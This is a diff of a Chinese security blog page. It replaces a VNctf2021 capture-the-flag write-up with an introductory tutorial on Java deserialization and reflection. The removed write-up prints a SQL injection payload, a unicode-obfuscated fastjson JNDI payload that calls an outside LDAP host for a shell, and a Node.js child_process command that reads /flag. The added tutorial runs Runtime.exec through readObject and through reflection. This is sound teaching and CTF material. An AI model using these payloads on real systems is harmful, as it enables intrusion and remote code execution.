@@ -8,7 +8,7 @@
         
         
         <link rel="shortcut icon" href="../../img/favicon.ico">
-        <title>VNctf2021 - hkk_blog</title>
+        <title>初探java反序列化 - hkk_blog</title>
         <link href="../../css/bootstrap.min.css" rel="stylesheet">
         <link href="../../css/font-awesome.min.css" rel="stylesheet">
         <link href="../../css/base.css" rel="stylesheet">
@@ -45,7 +45,7 @@
 </li>
                                     
 <li>
-    <a href="./" class="dropdown-item active">VNctf2021</a>
+    <a href="../VNctf2021wp/" class="dropdown-item">VNctf2021</a>
 </li>
                                     
 <li>
@@ -65,7 +65,7 @@
 </li>
                                     
 <li>
-    <a href="../java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="dropdown-item">初探java反序列化</a>
+    <a href="./" class="dropdown-item active">初探java反序列化</a>
 </li>
                                     
 <li>
@@ -90,12 +90,12 @@
                             </a>
                         </li>
                             <li class="nav-item">
-                                <a rel="prev" href="../DASCTF/" class="nav-link">
+                                <a rel="prev" href="../isoon/" class="nav-link">
                                     <i class="fa fa-arrow-left"></i> Previous
                                 </a>
                             </li>
                             <li class="nav-item">
-                                <a rel="next" href="../%5BHTB%5DDT/" class="nav-link">
+                                <a rel="next" href="../ssh%E9%9A%A7%E9%81%93/" class="nav-link">
                                     Next <i class="fa fa-arrow-right"></i>
                                 </a>
                             </li>
@@ -117,17 +117,13 @@
     <div id="toc-collapse" class="navbar-collapse collapse card bg-secondary">
         <ul class="nav flex-column">
             
-            <li class="nav-item" data-level="1"><a href="#vnctf2021" class="nav-link">VNctf2021</a>
+            <li class="nav-item" data-level="1"><a href="#java" class="nav-link">初探java反序列化</a>
               <ul class="nav flex-column">
-            <li class="nav-item" data-level="2"><a href="#ez_game" class="nav-link">Ez_game</a>
-              <ul class="nav flex-column">
-              </ul>
-            </li>
-            <li class="nav-item" data-level="2"><a href="#realezjvav" class="nav-link">realezjvav</a>
+            <li class="nav-item" data-level="2"><a href="#_1" class="nav-link">序列化与反序列化</a>
               <ul class="nav flex-column">
               </ul>
             </li>
-            <li class="nav-item" data-level="2"><a href="#navie" class="nav-link">navie</a>
+            <li class="nav-item" data-level="2"><a href="#java_1" class="nav-link">java反射</a>
               <ul class="nav flex-column">
               </ul>
             </li>
@@ -138,105 +134,158 @@
 </div></div>
                     <div class="col-md-9" role="main">
 
-<h1 id="vnctf2021">VNctf2021</h1>
-<h2 id="ez_game">Ez_game</h2>
-<p>是一个用js写的前端小游戏，直接找到初始化的函数将生命和武器调大</p>
-<p><img alt="image-20210316150206190" src="../../img/image-20210316150206190.png" /></p>
-<p>直接调用初始化函数Init()和NextLevel()函数跳关，通关即可</p>
-<p><img alt="image-20210316150206190" src="../../img/image-20210316150647294.png" /></p>
-<h2 id="realezjvav">realezjvav</h2>
-<p>笛卡尔积注入以及fastjson RCE </p>
-<p>进去以后是一个登录页面，提示数据量不大</p>
-<p>猜测是sql注入，fuzz一下</p>
-<p><img alt="image-20210316153519410" src="../../img/image-20210316153519410.png" /></p>
-<p>报错注入，时间注入都被禁了，最终尝试笛卡尔积注入成功</p>
-<p>payload</p>
-<p><code>username=admin&amp;password=1'and if((ascii(substr((select database(),1,1))&lt;200),(SELECT count(*) FROM information_schema.columns A,information_schema.columns B),0);#</code></p>
-<p>相应时间大概0.6s，最终跑出密码成功登陆</p>
-<p>查看源码，发现一处可以任意文件读取</p>
-<p><strong><img alt="image-20210316162413676" src="../../img/image-20210316162413676.png" /></strong></p>
-<p>尝试读取springboot的pom.xml</p>
-<p><img alt="image-20210316162558262" src="../../img/image-20210316162558262.png" /></p>
-<p>看到了使用了fastjson，并且该版本有RCE,尝试利用</p>
-<p>利用github上师傅的项目</p>
-<p><code>{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://IP:7777/Exploit","autoCommit":true}}}</code></p>
-<p>发现有过滤，后来大师傅说可以unicode绕过，然后找到P牛星球上的文章</p>
-<p><img alt="image-20210316163016012" src="../../img/image-20210316163016012.png" /></p>
-<p>将部分关键词替换unicode编码</p>
-<p>利用大师傅的项目即可弹shell</p>
-<p>附上链接<code>https://github.com/CaijiOrz/fastjson-1.2.47-RCE</code></p>
-<p>最终payload</p>
-<p><code>{"name":{"\u0040\u0074\u0079\u0070\u0065":"java.lang.Class","val":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"},"x":{"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c","dataSourceName":"ldap://106.15.250.31:1389/Exploit","\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074":true}}}</code></p>
-<h2 id="navie">navie</h2>
-<p>一道js配合re题，web🐶实在不会</p>
-<p>源码奉上</p>
-<pre><code>import express from &quot;express&quot;;
-import bindings from &quot;bindings&quot;;
-import { fileURLToPath } from 'url'
-import path from &quot;path&quot;;
+<h1 id="java">初探java反序列化</h1>
+<p>java序列化是指将对象转换为字节流的过程（ObjectOutStream中的writeObject()方法）</p>
+<p>java反序列化就是将字节序列恢复为java对象的过程（ObjectInputStream重的readObject()方法）</p>
+<p>序列化对象类必须实现java.io.Serializable接口，并且所有属性的都是可序列话的</p>
+<h2 id="_1">序列化与反序列化</h2>
+<h3 id="_2">过程</h3>
+<pre><code class="language-java">package Demo;
 
-import pkg from 'expression-eval';
-const { eval: eval_, parse } = pkg;
+import java.io.*;
 
-const addon = bindings(&quot;addon&quot;);
-
-const file = fileURLToPath(import.meta.url);
-
-const app = express();
-app.use(express.urlencoded({ extended: true }));
-
-app.use(express.static(&quot;static&quot;));
-
-app.use(&quot;/eval&quot;, (req, res) =&gt; {
-  const e = req.body.e;
-  const code = req.body.code;
-  if (!e || !code) {
-    res.send(&quot;wrong?&quot;);
-    return;
-  }
-  try {
-    if (addon.verify(code)) {
-      res.send(String(eval_(parse(e))));
-    } else {
-      res.send(&quot;wrong?&quot;);
+class User implements Serializable {
+    private String user;
+    public void setUser(String name){
+        this.user=name;
     }
-  } catch (e) {
-    console.log(e)
-    res.send(&quot;wrong?&quot;);
-  }
-});
+    public String getUser(){
+        return user;
+    }
+}
 
-app.use(&quot;/source&quot;, (req, res) =&gt; {
-  let p = req.query.path || file;
-  p = path.resolve(path.dirname(file), p);
-  if (p.includes(&quot;flag&quot;)) {
-    res.send(&quot;no flag!&quot;);
-  } else {
-    res.sendFile(p);
-  }
-});
-
-app.use((err, req, res, next) =&gt; {
-  console.log(err)
-  res.redirect(&quot;index.html&quot;);
-});
-
-app.listen(process.env.PORT || 80);
 </code></pre>
-<p>看到导入了一个自己写的模块，并且可以读取文件</p>
-<p>并且说明静态目录为static，可以尝试读取binding.gyp</p>
-<p><img alt="image-20210316171820329" src="../../img/image-20210316171820329.png" /></p>
-<p>或者去读运行的服务也可以读到</p>
-<p><img alt="image-20210316171950805" src="../../img/image-20210316171950805.png" /></p>
-<p>总之我们知道生成了一个addon模块，尝试去读addon模块</p>
-<p>查阅资料知道默认会在./build/Release/下生成.node文件，也就是addon.node</p>
-<p><img alt="image-20210316172158973" src="../../img/image-20210316172158973.png" /></p>
-<p>下载后反编译拿到code(ps:我不会🐶)</p>
-<p>利用constructor构造函数，并利用import动态导入</p>
-<p>发现并无法弹shell，只能利用写入文件读</p>
-<p>payload</p>
-<p><code>e=(1).constructor.constructor("return import('child_process').then(child_process=&gt;{child_process.exec('cat /flag &gt; ./test ')})")();&amp;code=yoshino-s_want_a_gf%2Cqq1735439536</code></p>
-<p><img alt="image-20210316172827716" src="../../img/image-20210316172827716.png" /></p></div>
+<p>User类继承了Serializable接口</p>
+<p>序列化和反序列化函数</p>
+<pre><code class="language-java">package Demo;
+
+import java.io.*;
+
+public class Main {
+    public static void main(String[] args) throws Exception {
+        User user = new User();
+        user.setUser(&quot;f4l1K&quot;);
+        FileOutputStream file = new FileOutputStream(&quot;f4liK.bin&quot;);
+        ObjectOutputStream out = new ObjectOutputStream(file);
+        out.writeObject(user);
+        out.close();
+        User user1 = (User) unSerializ();
+        System.out.println(user1.getUser());
+}
+    public static Object unSerializ() throws Exception{
+        FileInputStream file =  new FileInputStream(&quot;f4liK.bin&quot;);
+        ObjectInputStream input = new ObjectInputStream(file);
+        return input.readObject();
+
+    }
+}
+</code></pre>
+<p>f4liK中就是我们序列化的</p>
+<p><img alt="image-20210319162908083" src="../../img/image-20210319162908083.png" /></p>
+<p>利用ObjectInputStream中read.Object即可读出序列化内容</p>
+<p><img alt="image-20210319163419406" src="../../img/image-20210319163419406.png" /></p>
+<h3 id="readobject">readObject</h3>
+<p>当我们序列话对象的类重写了readObject()方法，我们再次反序列化时会调用重写的readObject()方法，我们用个例子说明</p>
+<pre><code class="language-java">package Demo;
+
+import java.io.Serializable;
+
+public class Testse implements Serializable {
+    public String name=&quot;test&quot;;
+    public String getName(){
+        return name;
+    }
+    private void readObject(java.io.ObjectInputStream stream) throws Exception{
+        stream.defaultReadObject();
+      Runtime.getRuntime().exec(&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);
+    }
+}
+</code></pre>
+<p>我们重写的readObject中会调用计算器，我们序列化该类对象并反序列化</p>
+<pre><code class="language-java">package Demo;
+
+import java.io.*;
+
+public class Main {
+    public static void main(String[] args) throws Exception {
+        Testse test=new Testse();
+        FileOutputStream file = new FileOutputStream(&quot;f4l1K.bin&quot;);
+        ObjectOutputStream out = new ObjectOutputStream(file);
+        out.writeObject(test);
+        out.close();
+        unSerializ();
+      }
+    public static Object unSerializ() throws Exception{
+        FileInputStream file =  new FileInputStream(&quot;f4l1K.bin&quot;);
+        ObjectInputStream input = new ObjectInputStream(file);
+        return input.readObject();
+    }
+}
+</code></pre>
+<p><img alt="image-20210319164349339" src="../../img/image-20210319164349339.png" /></p>
+<p>所以readObject()如果书写不当。就可能会引起反序列化漏洞</p>
+<p>但实际情况下不会如此，我们需要借助java的反射特性</p>
+<h2 id="java_1">java反射</h2>
+<p>Java反射机制是指在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制</p>
+<p>Java 反射主要提供以下功能：</p>
+<ul>
+<li>在运行时判断任意一个对象所属的类；</li>
+<li>在运行时构造任意一个类的对象；</li>
+<li>在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；</li>
+<li>在运行时调用任意一个对象的方法</li>
+</ul>
+<blockquote>
+<p>forName()--&gt;获取类对象</p>
+<p>getConstructor()--&gt;获得该类中与参数类型匹配的公有构造方法</p>
+<p>newInstance()--&gt;创建构造方法的实例</p>
+<p>getDeclaredMethod()--&gt;返回所在类方法</p>
+<p>Invoke()--&gt;调用方法</p>
+<p>getDeclaredField()--&gt;获取类参数</p>
+<p>setAccessible()--&gt;如果参数为private需要设置为true</p>
+<p>set()--&gt;设置参数</p>
+</blockquote>
+<pre><code class="language-java">package Demo;
+
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+
+public class Main {
+    public static void main(String[] args) throws Exception {
+         User user1 = new User(&quot;test&quot;); //实例化User类
+         Class Userclass2 = user1.getClass();//获取实例对象的类
+         System.out.println(Userclass2);
+         Class Userclass= Class.forName(&quot;Demo.User&quot;);//获取类的对象
+         System.out.println(Userclass);
+         Constructor con = Userclass.getConstructor(String.class);//获取对象的构造方法
+         System.out.println(con);
+         User user = (User) con.newInstance(&quot;hkk&quot;);//新建一个user实例化对象
+         System.out.println(user);
+         Method method = Userclass.getDeclaredMethod(&quot;setUser&quot;,String.class);//获取类方法
+         System.out.println(method);
+         method.invoke(user,&quot;hktest&quot;); //使用user对象的setUser方法
+         Field field = Userclass.getDeclaredField(&quot;user&quot;);//获取user的参数
+         System.out.println(field);
+         field.setAccessible(true);//设置privite参数可访问
+         field.set(user,&quot;f4l1K&quot;);//设置user参数
+         System.out.println(user.getUser());
+    }
+}
+</code></pre>
+<p><img alt="image-20210319180807000" src="../../img/image-20210319180807000.png" /></p>
+<h3 id="_3">利用反射链执行命令</h3>
+<pre><code class="language-java">package Demo;
+
+import java.lang.reflect.Method;
+
+public class Main {
+    public static void main(String[] args) throws Exception {
+          Class exec = Class.forName(&quot;java.lang.Runtime&quot;); //获取类
+          Object method = exec.getDeclaredMethod(&quot;getRuntime&quot;).invoke(null);//获取类中getRuntime函数并调用该方法的实例
+          Object method1 =  exec.getDeclaredMethod(&quot;exec&quot;,String.class).invoke(method,&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);//获取exec方法并在method实例中执行
+       }
+}
+</code></pre></div>
             </div>
         </div>
 
